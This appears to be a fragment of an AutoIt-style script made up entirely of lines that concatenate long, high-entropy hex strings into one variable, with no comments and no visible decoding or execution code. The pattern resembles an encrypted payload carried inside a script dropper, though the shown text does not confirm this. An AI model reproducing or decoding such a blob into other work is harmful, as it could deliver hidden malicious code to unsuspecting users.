	$j = $j & "85C9DF2B784DD629DE50B743DEC714E951C12061D88F797439E0234CD7E42C47AD4CC053C8EB051B70B27B014DDFFBCFF58254CB26E3F4813A4BC006213A50BF16CB2847C5D9AA838D1CB78E0B766B689A6D96624DE37FF8D1C1A8C5426601A68156DC938D31F3CA41D588D174874105C21432EEDC015CDC966B1E29AB0C851F9C46BA075D8E7FE0F4FE1F76B0C8ADA07D94BDF1293E"
	$j = $j & "95D1DFD37DE8A877E7A0216D222ECBA07D3E0847B80F414D7C12BFCFF684865ABA840118B0CB7E7D62993FC777F8B6AF452565799919AB1060AEB8E02326ABB9E12D15AB527C198DCD68058BBA500F2FAE7CA62CBA24961844DD1CF7E1C7228C84B3D895B83610C914D2D67E3678F82047BCF79E8F02751B73B4A9AF280E5CA3F389AB8CDC979BE66C733E73114A197C34B0A225BA74"
	$j = $j & "1AE7955B9748CF407F7868DB67EE324CF5EB8E24774A2EEDDD03F05CB9587998678FDAEDCC2F51307B97883743E795A91A0A3D077284082BE04AE83A061475300A345E6B69235AFD42A9EBD25A8BB3BA65E817EFD654009DD33FC4B1E29127B9F584088D5AB89895999A7352B3FBFB444BF5F66C597F0DB51160A34E4329222EC86CEBA0786606FCAAFDD6E00316939738067BFEC8C1"
	$j = $j & "1B60595B85833F3030235F92825E3908E0144DA579929CCFB3D1AF0E49132B9500D728D6F52B33BDD2FB6967F1D2FBF6BA3B48854077ADAF1A02EAA203844E457D7C56C9531ACDE692D2D2A8153FED344F337B490D497756D51138EE1568F19568BFBE1E1B738F0B731A900B72E75049A05F6840E14E4D69B5EE75C13BAEC9881CD1248E3D2700C2E7A8B2BA440CCF6042D7BB49B6BB"
	$j = $j & "F0BCB6CCC806D87582FBB48CAA84AF5E0749D5327403F4ECD4BE543534D8670370BA77D8BEE9DFA80CDCFEF2A3DCDE3F8A620EDF8D3FF9A4DD2347A1319791EC0F1774CB433B240B39D4306FFD41CD1326325AA516AA3EC724E9C563B8E44E179C85E9364CA2E0EEE5623C9B540CA0BEAF732D0B38326D3BB380B551D511EDAE1657A5124E67849C4B47995AF495AE769D4A2ECD7F80"
	$j = $j & "8438770E2C2F0D4D0482D68D09A16967294967A4B63C2E887DC280BA37487FC923C21B4658965F9190B559BFD4252E517FAB48745D8DB9E8E65A3F21A0C9BF90FB7C05AB33D64D0DFA4195D895E955AD7E08A44AFD245853F2C217625F098B9DBFC80EEB457CCA0FDA4B6E314B1D170B314CEBA2EEB23C31318FCBE65F533C059616081FA141750BFA7E8969A240199D060AA7C75925"
	$j = $j & "D105CD102FF48EEE819E98C590DB0450AAF07E3199AE0123A7508D0326DE38BA46972A6CFAFCC5394BB7FF6DD5A19AE25A818C63D777429933DF2D74B96A226356BAEA11412F81DD9730C19217C234F7855DB88897906BD2AFAEA7DCBBE262F2C7B2D4D6077172208D715D74C7CD9ED08F53B86D3D53DD725C8B0582940D0119F17190E752D6AB07838A5D391149BEE6792944A05E25"
	$j = $j & "B70C93847BEF04FEFB72C1D6BEF732F236F09C5FFC370D3FB873E9D8F82F1786BE7A7EDA656D8D9E605ACA1761F33EC4FE482C35CEF9347694FECCACDAEEA73F5D41AF73B7A3621D348C1CD064393A710FDD881E22D50316A3D014DFEC7B7D599DC5B96D70400150B337B745DF5C29063EFFB30F9DDAA1612E4E31210832D5F8AFFA5B285B99186F80469F2D973F6DF3F99F46E043AD"
	$j = $j & "4886CA112E727DCFD87D9C8D0E6073065FB0A8B9EE04FA0D60A00B2F328EC1FB3E53091D3F7739D7EBF27CA830C750B18A45CC267EF2B4100E0C43050278B1D3F620518FC0958205F658CC3135502275AD691558B86116B88C135C60097C9F29200F2EC535B4C57CFF484711669825E36B3ADAAEEBF985EC4CCFAFA8871D686702C7146CFEE6BBBA687FA80EE498F76E46E0A0A37D5A"
	$j = $j & "DDC26F9E972AF902DA6A4CA0E7F2E6B96A8B6BE2D0DA8F0E23D17E36E2E1DECA5D6BF2E08920988C8A50E6EE5226EEFDB9F9CCF5CA2B990F09C6B472349737B0D4CF89C021B8B6E57E41E4D01631042C2FFEEB889D4100064A7912FA3983735463A2F60D5AD3896111A167F9AB65B92403DED28DC8D7C1449196A85168DDB3018E911C6F28258795A1B6FFE790407C88C6E5C3FB8F29"
	$j = $j & "A3F6F279D75A2822737957F647EB19543FF3EF3661267F25667FEDA7B7095AD5095EA3E0C9E479BD4886545E561A34E774DA4702D9DBC7EECA3060D0DF531C6995B473AF14E9A9ED4B766F8046CF646D1E634D074ACF2FE6A896E6814A5D6F93FA698ED61A41CBA07D7338DA99BF31FDBBACD789ECE4BC9292F86FCEA9A0AA87B93F0C1781674DAD4C9375D9EE85046D5C56EDE0FC34"
	$j = $j & "15F5A31FFB8A9D50A40D6DEE1DD060A6D11865A491F99387DC5D3857F32D401F2F0753A04396ABADE1B57D31BFE68CCC38A9F60765F5614B38E98C3C042AE2423343A3D240897E318AD5DF1274D3662D622CB8A367992D496C179579176C330B3876E8813B6ECA86E3F56BA85699365D7CB35E2A51753DC0F2CC3660FDFFA39655F5F2A49E0D0418EB3FA0B334E479D16CD5DFE3DE4E"
	$j = $j & "14C0805F284EB5A040C53D6BAFD79BC5BBA8A3B9FE5DD13503A921189B7655EA35DD11BB67672AC83806144BA0FF6824FB9A0738983498C9D682F8F8BF1D2F4FC48ABE5BF33C3411262ECFE9C074AD202CF9C865F7F9458A9CE3318C9BBF42B3D224056E9EBFF82CDE1D0D961B17FFE5BAAC654490F9C0D38BB9120E25E2F86F526E3C58DB1FDF42437B32F8CC8010EBF3466850F62C"
	$j = $j & "4FB3A53A68EC7B07155C910F55F6AA304B192FCC360672F3AC40EE2B1B5BFF38568C381C033BCB2E20D6D1135492BCEBB63B127CD52B2E48D4EC3DB5C8A9D8CE71448A68240F9ACA2232EDB7D007E60D1DE9FE024609D99CC2BD826C49BEF03FDCA3F52C8B70685D3E03AAF0E75008ECEBB09167BC51DF015F53682C580C338364A58B38D37DB7B513FFB3B567B80A49694D09C7FF4D"
	$j = $j & "87D272EED5DDE9EB245D3616F589822C02F092DADD334E181CC105720C219F9A78C9A03356FC1CFF7AE76455ED5D254C0A87BCE88C706EFB037FCC9613A3A1495FD1620BC37285C59A1AEA18751FA160D0382615AB4AE4EA859B60FA7C781C5837CED052BA5D05FF43D52AEF2CAFB1ED8370059DB40BF141F1561A6DF4758E0EFD2F0D512E805D9087D9279A0348EDB8A96D255B900C"
	$j = $j & "E0E1C7C7837F42F807AD637F5EF115E76C55B659D6080FC6934F29B364AC1704BBC61C260654492E119C83AC5FC5E832EBDB52D40A65ACF58CC680B147E1FA9683DC9578651D8734CEE9A60098A4B7E26AEC1A690A8E62C5E85358861323A6A76E0453D4CB88B8B4F34CDE80942924406FA08B5FCD26FE7879CAA112E620FA20E00012D79DA2F91C32021B9A49D2735B493C1322990B"
	$j = $j & "6861EE2C453F08F7C533AB0B20C79B73438F7115435DBE1ED79DCA84D002B22647FD1A9D02E2D4E5FFC8ADEAF082515F65EFB6EDA85BD2D4B03FBA457D9CF0C314181DE8A73D4CC1AC18C94F63C0566EBB0DE73675CA74B0108F2EF34270824E9479B9D5C37AA1D3A0BE1624956DCA45E9DDAA9072C0BBCD0F93707ABBACC0A8A3CC62CCF042F8C73CE3A35E4EA8AE0A56B4BD9659E6"
	$j = $j & "5AB5EB21C3E389E5E773F92136AED25023138D0FACA8C98FB4C917D84AA6EAA126D7DE0209F424EB8AF32172EB0E2D2E05A354CAE5B4CC06DACDD9FE76E698620D1EFB20A75EC57675858A256A48017F127698297809CC6DFC4593457ECED5DF83535AFAE3E4473588F41B9315EA42FB6CAB5F02771A9F2B378353B3AA2EB19780A98A7E311ED50B2E8CFCA0F0BD4EDA2BECCBEB5974"
	$j = $j & "67D7AC3B62DBE6F84B2B656C277D3A118A56ABFA0F9E110EB5B071002A4C5730346775091B6AA3C20E99BAE27F6F1C40287E47E130C57E2EA1AEBF2F78A12E418DE51E29AF70B142AB47C042B59B1F72A87A2A2D04EA9D48B233E57E617589FB4C1C331650EF8E27C02250F14B4121F6C372F3E6A602E672BEF2E9DD7DDB36AA0FB167A4770095A876D5C98CA70BBF54FBE784711F49"
	$j = $j & "28A1035628DB75EA1497E6A021FC2E634647FE444D5FAC8CFCE34869B8D13EE83A4563429502CF606774804F5E7100AAC3AE96CCDE9CD704C0DD4A6795649DDCF60CC0FA46E28007615E0C1C600F922C08036E9E9539C4DB68842D20DC1510FEB85A17A1B845CA13ED0B45C117B32409819440E051C10A92354B9653853081DD048F3816960735D86C452A2F5A2AC5C6102F00E7FFA6"
	$j = $j & "3DC5161A15DCAC0A59195066F31827155BA2FBF04772A871B2746458A15CDA9D828567631E0A2BA7D8E9103AA68468EA5FC26BCD9BB441A6D99FD1338141F03FD1DF070143C5086FDE8D492685B12832D3ED02DC289156132F8DC2E1F0A72B218DB2ECCE3F8494C6F9A69678EECBCB7994983F38CA510F07CDE6DC292A2F409984B5876685A53629FC9F32D430FC77BC812ED0634154"
	$j = $j & "72BFB2CDB226B5859875C3963F0918EC908DFCDCE98926B515E36D817BA7897092280420827DD936D55F44EB2EA2722506FA933E5BDBF399BAD2452C7D4E7CECAA91488E00091B8B3E1B07DFE16CD4222B8EC2BA24A120C83E7A766FD31773763EC40540B1D4BED622483A5C0AD0C193127F0F6547ABF32801013B088BD6529EB9A8B1F5B3781CD685CE3E6AF0437673EE8F01D50E64"
	$j = $j & "4EA6F4FB674A5E9905CE72A80393F04B5F4F71172AC4A8C07FAD54C303F998B7A300D10B4FE62E33076AEF5B8459D3482B307A018F8DEF85CE6EECD9C681F4601FB22A89A91EAC6D660A0E8C6AAA5485C1CE148718026D7AD9D71DDE88BD91962F5069D500A5FCF93E3FA870E826F89B9790CF78D383FFE2C5AD2DC2505C538EFFDA1DE32CDD03E2B617F072460D863E549310E0463F"
	$j = $j & "51C422D2D23EC7442867EE2851B35D1F45D045D03A3FE3C5F783A40B0992A6AD7635463ADCB6F54E17EED9AEE415BE27E961261D898D686359AE1DEAEBD2C79C595F09FC378B09113E3826F0CE1E818E8DF8F2B41AE71FDD889887D89B538D29B34C42DD57F389EE427E11ABDECF38CE2B2DFD8C7BDC62DC798D6D4CD047C62BC0087C3FAB737660B8E99586C59ED38F141A6B291CA6"
	$j = $j & "D6F395E93329B3A26DDC554FBF6842A48ED3A84FCE9A65CCAE428B4D48C5A7BD0DE442F4EDBB7572DF8C2C14A982C41B71CC1252B799002497893BA1455B25AE3110050CFD81F3F7A900213E469E1C111BC89312E0AC9FBA90D01E3D4F5AB8BE6DE6580F362F1814C236275538F7A831ABB4FECA16FE833015D13E49A9AB130F9FCD6DB94FE582D9C0406F92DD316B180727D911E6EC"
	$j = $j & "FC64B5CC565A5EEA4E65CD106E1D18AC4063C2578527AD2629695271477C2DD7693CE5D9D0507D68A733B5335E7A860215C176266FFBEC04BC732C681104D45345B6375B96704960F07579D259E5A9AFB713C323DEC62E4B82199D317797DB544299EE23E3BB7D38242E0994B9055D7FDD14A5E4E10567BF284C38263B7B4A7A4ECC6E978BB73B4CAD0416809E520EF0EAE38FA72F17"
	$j = $j & "86BF3B4685DD55A5E86B7039B01E4E03C4F0498A0D1C6D6ED8AAB5E3E16E52C996992262772566CE0B46D37D0AC41300BD40E1D8B4100B7F33FE963585973DD1BE63E36A4D4A73A00433FD31A658EA8D0E97FF1C735C64D033EFFE71A3DF94FD359869AEDF35C25A36F8A098925DDB5EA30A85E828D9F6A6FF07804384758E83EEC482212E217D49802D8183954DEED5649194AB6AB0"
	$j = $j & "820E1EAE15D9C69CFD1CAA36D759E731B96F7E46BE0C0274EABA6852BE0302B6C64072AE868F78C4696657769099EE63A4670AC1FFAA7E98DD72F92B135BA6EE925D94B7184798F91AC39A487CC528946CFB796756394F1A6E7D479498E61AE7A25640659BA2490A6BF09047E75B8E81123C1E543A1E674BDBE92259787F6FB35275D4F90FF19703436003245E7C20654A700D66B447"
	$j = $j & "C34E6D7007434C624F0812CFC0D841C41985E430E7F5479795F6B7628D22A48B6B6CF716F0E4A98196CF25998948DA39E695DD678076C1EAA30F1EE26B33E624651449E874EB442A3BE461BFA77200654F29A8193FA9C0C87D17E0C25A4908F053E2CAFFDEE0D3E1FDAFBA5EEA363839BC9E88F9FFBB38AD526D40DE7EBB414B4043E959450EA587A4D69AA02A9E013B82B006C1752A"
	$j = $j & "7E47EA5D27896FEC14A829071B6E26E74A5541B0294CA6E8612FD4A9E0E6CCDC1FAA1A54EBF9DA963009D3085468F2AB66EF84AA6ECB6C384477EF523872AD1095760BEBC793D89854D9F24F09F93B8AAC0BDBEABFDC5AEB76C4CDECE98FF4BCF1CE85B1AABE1F90FB0900C6FEF273D805392943F79FC55CE371CCDD6157A56E7130FB7D711C30C98696F1E3D42B4BB93EEF2A3CC710"
	$j = $j & "55BD8CCC67395DC842A5ACE0D3A98F809463484AA62438D0820A332B9F0258FB74321E78771CC99A6F86B958E60FB0252D4B9F0F47968486C0FAC3BFB7862068837446C195733FAA66DAF455F793F924FF84763300D42E727572617BB4B0DBDD74B3B7B6DCBD9B3120A8B3A4A38550A0A5E64A50578B78AD1890DC3B38D6466B49B94FCA547176E6019B8CDA8A5EACA5F60C0C680E1A"
	$j = $j & "CA9E86E73C3C2561F069D39D653986F72776EB3557D8F14F837BAD58634841F54A4D655B17D0BC18B11C3AD4F44309FBFC381D4863152771C373AA9BDC4C361856E0E68225F4BA9258AF18C6A25E31D9CE1736FA33B9281404CF0FACCA766703B70ED48DF30008F9E8185011E6358C2B593B5D9B06830A8761ED9764B7DEE48C03617595DCE4E77694E1DCEC37958E9B9125A52E6EEB"
	$j = $j & "8C763B08340B2B7FC2F4DBF4B4E2000AC209E080CCDA5A627EFAADBAA04345B56647F3E4FECC560AC36AAF099A6AF5E430E95C46537B7E51CDE0A6F97C400D440F9BE3AB6617776663325FF17048DFC58B0C26DF8EDE8DDD202557E354FD56EA9CFC35F49BC55B5B01F2F27A7C23452A6B4FABDF35E14BE6D8D812580C7B5BB021C5E40270CE8063724D72ADB887F51B04137F5BECAA"
	$j = $j & "A0EB84B431D008251EF63F96A90E4F69AB07EA12DAF32A5FCC7CC04FB06A23437FE2A5EA5E95742B8451304E5607A33A53A844AC62C4C3B7476E6774882CE80A7CC9320AB9E3073EDF88C0EEA56CBE9DDA16BD8249C93D15966887229C3A41754494D6968A9AA64ECC6B5A4279FC966906BEF2665594B1CF0A2A7E7D09F693B2EB41A201C3F121FC3B635AE9F6F8BDC5AC38B8A5CA3F"
	$j = $j & "3A131E3854321EDDFBC1BBB659935BEFA0BDEA64183AFEB6CE5F15D74A653DE24B301D9B6891477DC65DC2DE610DC0A4F74ABC807B744EF3F8FED8AAB786E94F888DE57085536E43B336023D45653C2359AC61B5F351DBD78405037B041F96FA4985C8132C92F802FC4B86B9688728F359D03A82AA2FA1FE404EEB87269E8B5AE0661A2B5DBC86BC0DFDC68782FE466F1D5070FE3EE0"
	$j = $j & "AF45008B87E4E82736E1CA4422B77BC87FBDC5EBB01A4A5DDE24F9603116104993AE8FCDE1256006997941102691549FDAE0F8999AB7D13C6116BA79FB768B14410C16F5C966816EF3101D1E0740FA096AF7F62A4DABA81E19642495B89EA607FD95D57B7FE071CC0D16FF8EAD9A62EC05829567910CB8C5F7FC2A316C1AB2891AF918724F999FED21997E1C80BAA69D2CBBB8EB11AF"
	$j = $j & "F03E3B16500D812EC716981E1B3FAFD8954E8ECA131D16E831569D9D8E2B4FDFB069D266E87C08439C35910DDF274C30238D1EAC389EBB9617C107808E91A3592DDED212DF0664702EB630A721496908D7DC6E6FC7CEE0A5CEB21E90FBD0DFBFB09D2E08A8F929B8C0322CDECAF2F684E8E337945AE7C37F90CF1ED372AEDEC3893E9C8EA40BDAAC0FF1627E3AF3267B6E46F46185CC"
	$j = $j & "5F282DF56BF25FF9F9F9BED751DF40565A89FAF45A688F77F9AE863881D0AD21F13497DACA6A604BDD3C78FD55209F581B122D5CD49BAF4B6107C66D16F8746FCEA3037DF1E88F89439564CF5D0329F8AA0D3DD0EF531D5A48A8F14A52CDA4630D329D9DF989B22F914D0E769D532BAC45B8D475336E19135E2DF2B71503518E2039FC977652708CE7430CB234CD2D1D9509D02F608F"
	$j = $j & "312A69EE1B32786C2CDECE054913E4DFB87A1FE26656420F858B5803656D3C2C200F0BED582302398AFF5EE186A071E47FCC60DB509B9AC8348990BDC225AADB0D75C7C31391E2D3EAD9E52D744E99529132B4983ACD7B1DA2DAC69ED3E012D9012F70C071D5AB4E9405E644CE7F75F536262B050AF6DE6175583A864D808C151C59A8DACA86E2216E3F1C661953DBA178F91A77D8C7"
	$j = $j & "1F5F2814D232E784629CD0EF2CDB123D5EC48D5404308A6603DB4573F813A55E1C853E406A6C4C453278436FB8C668F85AAB0E7D21DBE8AB40E12A0E8551A1A784CD16FB368C381D615036FCF96028A7EB4BE47784D70E62A35F69ED04D7A755B7F4B5BD89F6ED52E69094D546E72EC85E7479A6797634517887F05540D97E36CB0695EC0B9050F3FA56EF87257953FED3534D1753F4"
	$j = $j & "A628ABBAE865AD870BCACC60FDE3BEAE51B94BE739DEFDFA81BD0BDB1EAE69F3578B4EDFF5102982E8AB91B8DA69AEC247C761317B82758432351EC453E5BAE2014D6E465859BDC6C63444909B87E2148CF8D466C9C387F3860E839F1562F622E42E6808CDD12D3FA2CB3FA88C350D1CB6E5CA76434FE66F3E76B43F63271C1585249BA09A0EA5F1D3217C10195AB7B8FEC8E1C42AB0"
	$j = $j & "8855E91207293B3CAC791634E425662613BC25C0795A764754A5A4529827414E72D16C76D37E88422C4B9AFA3505F7AEDD666487249659285E901C0D5214AF197F044369F229F16429685C75DC7BB82E0420D21EB9371BCDEE494B205F2ED5AFCB186F1856339012F8612E62DF601FC77D9A61BEC85A313C21BF11007C33BC292F30955CBB69C5315150669437F023D4EF32255CF0CE"
	$j = $j & "8F9D79162188C045057263F67E41A303ED11423F24DEB4CD255A8F84AA1382C7075B70C2DB9408C83B6DFC8B735447843CA2FBD9C2A9BF4702ED6133DA3F1E744A7626100D7AFD3EE7006C99E4B5054218F2C8F601DEAB7E6493CBE440BD8CD84ABBC17F92EE6F8DA37A1FA941BE3B54C9C884E76CD71278872ECB54D6777D4BE9F0990B6F99CC7FB54663E3770BCE028041665FED99"
	$j = $j & "B0A25724EB347301E22350CA9CBFD85A3A68D952D785CC6D2B79F0260DA3D1857F229504FF95B27439AC37875DD7EB02570F2E6F3C5BECE9876F7BAB6183DAD16019D1EB61E094013448FE1A9EE656BD49A7EEF8EF8EB21C276D43318A2872F9E53DC62ABD8DAB7DD61ADFF7A3529EEC3C4AD1F72CAA9754BCA37AA2F946CF8667946DDC3D3E6D36DC59D6AB74EC8431AA72D6DF43D8"
	$j = $j & "6FA34A8F015FEEBB8178C6369BD6F45A8415E88500CC8BA7C476DDD1F2696777FF45617150788AB1F1759618EB7E747021B5E3A315D9404AC189ADF40D875626C482385E419B48E72834F1DF146BE49683ACCA89765F02925994D239172E81ED27659EA6A71CD96A0FD5983C8E731B08BE44220916E8979C32568F871309CECE184424D99A6A0B87F3712741C162B6F070AD6F44DCDF"
	$j = $j & "D401870DC8BA7EE78258110C5A4D585E5552522AB019F9282866BA802968FA18B96509E71048F3C77E35A4FD1A4A2D1512B4AE2D4265510DF0755DD2EC119E614DCB2B2F5D3B636C210E7DD66602EBC2EF234CD85AAF8DCBD551C7A43C163B7FABF223227590C736A2272AB7631FBBFBB2F054DCD978E9CCFEF4FF3BCCA21CBE3C1B6D19AD8C7EC4BD556BB85687B1269B7D6DA338C3"
	$j = $j & "685FD42EA87C96D018FDB9ED1693D563DD47971623B6349258FB7C72CEF240C180F8B5380A656149929778D93E26C752CF3F792A364379FCAB06AA542CF2B79E6BB972256F5375CAF0097FBD37BBBCE17EFFDC365BEB9153120869B74C9023D8B5FE692C7EFDDC309E428FB7EEB9270FF66A775B857A59EAFA8A0E3A13DAD680FAFC22B2DAB93E17CE45359EAF1E0D3F745B24C0A7DB"
	$j = $j & "F6F7732C3CD653EC269031AC42275FAF6887D356E4D1B0598A0E83DBB72F7E0B6DEACD378F63B30C52257D7FE4ABD5701332E255BCBA01DDD76D4E6940F391A74D2356DB5D0BBC15755914C9F3FD35757036ADDAF4038F40B0ADAD24311472E1C58BBC7F97AE7E9FD5FF69F733BAE3A40DEBF8DF8266A16AD637278459E544CD729DFBB0B40B72BA830B81D4FC0AD3559ED0DA1B58E7"
	$j = $j & "8082715248DCB62A195F332EE33E88A56283C52CDFFF56501B98BA864CF649D9B3476C07B0C6C956ACF1FAE6DF882E9C0DC6838F8C9A39809674E4C2E539D1E695343F5A9A819EA54830DDF2F6996DF6061BC960BC66F85985A04A02C90EE831A2B9B41F62E9642302F477EDEB94AA299DB384A2EB0DECB6BFCE29A489953CC398DB0CC62F8267672439E87A7D214A79A82E085D09D8"
	$j = $j & "1E0DD7280FF8C5C5384C604734E1A9372F2898FA33802249D696847238C22F6E946F72B2BA933459B6364A93AA86B96A7EF457F4217089B9A7F953AB7E2804A2F1B3CBAB22327053617CBE45BF52B5B48C7E3562869E852FCC1A626BB5B0E9871AF0C6072D212639BC739D871AE2673DDC71A2521649B7A46EBC6FFFE692D3C98027E5B4754AB17718C024734B6C3D5C8ED68252F732"
	$j = $j & "D254EB5ADA4B937F708807BAF4F6931C5885C463F6B0A42C7227635C28EAB748426F06B6AA964862690EC448721642A74F46871A7C8E87217A1B439A06B4B15887BF8E57EFA04933F7A23FAE091632DC0BB8286B389DDFDD8C3BA0CB27889125C44716F8D3F6C081E7A2DD4ADBF460E1DB2762903E460928F7C3408EBF9E5E8B8099C649654B404A123C86EB4C552112A82F8DFC2C01"
	$j = $j & "A38B9E44B7F60D2D61A38C31F5E710A2D11A47BCF29008F28CC089904932724BF7CAB748297A2EBF1BDC05D663D387968E605F60321039988152C9E5363B59BB00275B6EDDB8802D3B956CADA72FE9040DEBF156DA3C4FB0A50D971C5B62853ECCA2E59F1D2487AC53EF4F3AB3CABE31BDED25522C708D4CAA18EE7834B1E516136751D779187D7F6D3C3DB77D4ECB2A9FE6CA306047"
	$j = $j & "A2472AD8223820F356F08C3562C68A5766878D3266A1DDBD6124493E5523E57E8B9E88960B79BD8050394DC810D1ABCF1B0E4283D7FF94BE172FEEE421C0C703529A011710EFE698D873A1FDE21390B8A796680E1DAE97F6C5BBFC8B44D6CA3846F49495F1B9C43AB21AFED8259E55A3B5084650B47AAD8A1C55039C4FB71DCC7DAABD39E2A1E6D3F570667A3848A49F7023B84A727A"
	$j = $j & "07ABE877DC02EC3B4BC765EFEE71D5471EBD97CD1A4A9A7CC9419FB57C8DF10ACBA131AE8D73A8600E30B73513FCD1556317412060A4FDC193AA7628150E6908252F10B803F05861915143B801BC15599FC1ACEBFEA6D7D5CB86D6ED9FD6E0819F45F20A3A185DEA53D117A3A66D2CA9D10A2263F05A1F314E9039341BB0118422B9DDE87ECB4947A92BBA6577D17A2FD16E11D6F10D"
	$j = $j & "A2BF9F7D7177AEE3FF901B9284165D26787F9C4143D65A931AB3F2C439AC7E1EBAB75D7319B0A5C59150CCBA053F047A90D30B6B811CC72E2C769A863FCFD6AA8DB9C94A02FC7866166A218031627A912831088D3752C5BE98FC3F41620B59187E6591614C4C6750C8523842FBA73058CA70E7754AD9528B229F058A051AB1D63873F257806C8CB688D0D01B577D2DEB83B55C484305"
	$j = $j & "7FCACBE3E0E7EFDBCB0E71195099AE5AB1B3310511D97118DFC4C7EEA474B94D82680A8CCCBD80EA3DDDF19F9B5DC57E02C6C890DC67BAC77E2FFD051047932AE3C1C885B5700CC6A2B323AAC6245FB88960CBA8D2D1CD4A81C8C986943A786A6668FD5EAFF6003E88C79A8D8870475189C3C7CB3746766EBE95D74466064ACB632431B11DE1C05DA196DB936F4A6F415DE0D860C95F"
	$j = $j & "467285D76B898A0CC371B8A085067AA9F94450E528AE7571EBFF565E0FB7C6EFAC859E29ABC991508FCCA9F56B9B33A812CC1EDF1E6A58EF8EBE8E33C9F919E4C76EBEFBDAD255401490F71E908525F074ADF741D70046FDCC314247833A6FD6DE8578DE9501E27C66F2D4CCE30C48BDB2D96B20AD31B1FD9ACBA641D93213461FC0917DF4B390E2A1F2F566D1FEBE64A81B0141D02F"
	$j = $j & "3FE624D4106226D342C7FD9DF8A2E59E4F067DCF4BA84862DB9D99C44EA5E033E4A808CF53908B07E9268F5AF7BDD3B39E6C76B029DE9AB2817A0E07030DCBCA8013A4506C45E5B0BEFDB64EC89B741AB8FB3653D74CCB8115F747A1027D786C4933A020C574290C79F28EBD6BDE22C16B348C2BD1CCCC77AF8ABE6E10DA5223C314D1C6DBDF581710AC42AE0972B065EE2940080DB5"
	$j = $j & "321030C4AAC2D53EC625BE618BD7A6CCCAE061B5C0AC668FB130D71464900DA48A6002B22A7BF07D48F665D1180C20C04167DDAC3F82F74A42C94625D40EB8819006D3175287802129E77DE7CAF783D0A6F65AD0C6C8405735A434B86E5409FC2ABD3711E0132A87A93FAC0153FB042BAE2EE9A32705E28CB0ACA499E1ABCE7792F956A8DD1D4ED4A28A0F289322191E815AF89585D8"
	$j = $j & "02D664BC281A404DD48FAB1329CF5AE05E42B8C5E8FB82ED3F2CED5E9AA0CBA83D807AAE1828D62B13EB2AF1454F16A0F69141FDB32C565795C9F0D6EC347E8AE26F784C7F481F295ADA93087A487430D6013A6F174D577ED3C286EF6EEA228906A9D1D7BA5D08AA54F7D83C524FA10F2845DF52586D58F9728723193D87FDA492960D69CA19331E74B768E9AA3686D5C69DF2555E5E"
	$j = $j & "F1BF6BDD0237844209AD56D6A69C775644EEDA16C1AF2B4C6043C4AB162A975087A5644AC43F3BA4A632F0346F910002DD3687876FEFECD5A01682499DCE6E8BA4F0060FD200D033ADEE22182D3AEC932A566013DB756C0F96C5E836C83A33E8CA397AF4A44524BF559327A7606E896D6B6EEF97E7113DED26FEC9E561382113101A43F956864307DC77A1DDD38B1758066E5A0D308C"
	$j = $j & "A513D0CE36A875A213FB9898CE85DFE2D9986AC9CA9AFAE74A1898355121DA2E28260B10E8484F5EF1793EEF87C48F357A08DE10AA11011566D8B3BE2ABD9847E1839A11083AB2680047DC4E30E08B5CAFF9F647A55A2931EC4DBE98D132854CA271ABDB4AF3676F329383CEC3BDA0534582E99D457EF3DC63CCBBD10D131EB7B2879F62872EAB68DBB42D1EDEDDD313BBE4032F78C6"
	$j = $j & "38713AE14FE654951A677DD7AB56FECAB4DCC1F5F320C938EDD93A686F1D2592526AB18C398C928EFC8539806CD89AEF3D106FB8E4DBF6CD73ADE900E0B46AA84F9DEF23D3E0A8CAE2AD3E4179A630A1CA1269A3C2335AE535AE0B2D566DDD22E0E2C1C901E2FDCB1E9D990AF01CF5B0F64EF090BDDCFB9C923FE8CF1157B8D37C49F64BFF59444D2C8FF52CE4BDFA66C446E41030BD"
	$j = $j & "674643EC58015C2ECFCD8EB79396EA66B71844F584C3CF393F8CFE9DF3900783F908439C8B1F35391E8D9212A6A053A784D3E488BC210FF478EE2A0B2CC5B2FC63DE9102BE69F56FA3F1AE87CCFA589FECBEB9D81190EBD614F2BC12F6D88C75448208339AD0C7FB902FF7F9631A65E08CCE1069A6AF5854133D2CE55A5D3F385AA9398EE9EC727836297A2F238B028A931DDA4353E4"
	$j = $j & "2BF564148C632105637AE9D7FB2D15AA9F405475F3F2B51751492527019172DD9E12AC603A6D40044A0A80D8BAE66BFDF6E22DC6D6773FD2EDDD5CC6207E931F75E586EE928B3E4B2D7ADED97E1B6B622D6237105C7417BEECB42E9A570698212C63B8741CE9B46C1A2FF934B26EABA65E3E1227B7A72F53CDE52B4D1F4712F56EF62E13FE9DD01FB2E7C7FB6239612270F909D66CBC"
	$j = $j & "3C0E149BCC41FEE5C353C0EE1F809D8C26CE66AFC0A3341DDA34C426EFC24BB10131DEC424481BB7540DA1D935B72CB1C8659C6C340AD2657F045D50E625C28E15E7EE73467505620B9192ECCD2B304C5B6399F9918EC0B4E4F94100BCCEB4BEFF3B6225303189AF5CEA21D0807F007DE338CB212D41062A55A925D9DA542609767C50146AFD941350249A5CE1416411275D477C29A6"
	$j = $j & "A5AE17C3BB0381422F787787647A5506B67AABB9DF06866F9839E7642A5BCA6DE24DEFB09740926929F66883106AB0B0EC88BFAB1E6FAB2538BB3CB69809B338B6FB168CA2CAE303A7C2ADE5B31CED445A15E9371CB2D994830CF900C23626B1D9605EE3E0A9D3C9B8678BBA19B727DEC859764D1F9BF3A964DEDC306F69FBA677952D67A3CE25FD6FB3899734398F88D8D0D9BD4B35"
	$j = $j & "0477B14470A145F28EF1FD663997A3FA9C9B1D1B686AFB56F6F3646365709A155BB1F1B747D9558665097097139D2AB7D81B80DFAE659F517CE6D40D73569E5ED3B9505675498775B97C1B6E2CEF9B61DFD55C2BCBC614E51F1A0FB23B82099CDE3D1094400A06BE6FEA5C101AEECAB27C7A23D454B049FC01DC735B1C16DFE442F34F6680CC8D6C744CD8AFD33D4AC7C4F57EA8F577"
	$j = $j & "4709FB668D8BB61B327CFB738B0B5EF47F8FD6D8FB551437DDA6455048E68AF5A0BA8A28C2C902B8C07A1EABBE039EF81BDA3AB0002F4D0B1E6C9964125DD31304A3909B11A793D60D3DB44F7B020FD3FA4A36766CC714EF8AD43362E7D7F0616FC35212BDF7BA2748219BB8792FD988C70B6749C6B9FBAFDC659EF982D4642586C239CD546E9D917EAF9490C2FE2438E150FBA408CF"
	$j = $j & "03A97B8CAF167D4F964D866585F42A7886C7E183513A4E19A3E7218245A1620C4FAC2BF0900D18964719DD4C6EF0AB3B1B2F4A6071B89B6A79EB201AB75612401B3B79251ED5F6F7502F783835940C3618009033D42FCFF8D2DE9EB4A008DECEB8A91F1360FEBBFA59C881C0BFD650032D32F719214474E3E2B1C8848351F95920E858B17BA8D70D531FD3AC1689EF90D352ACC58467"
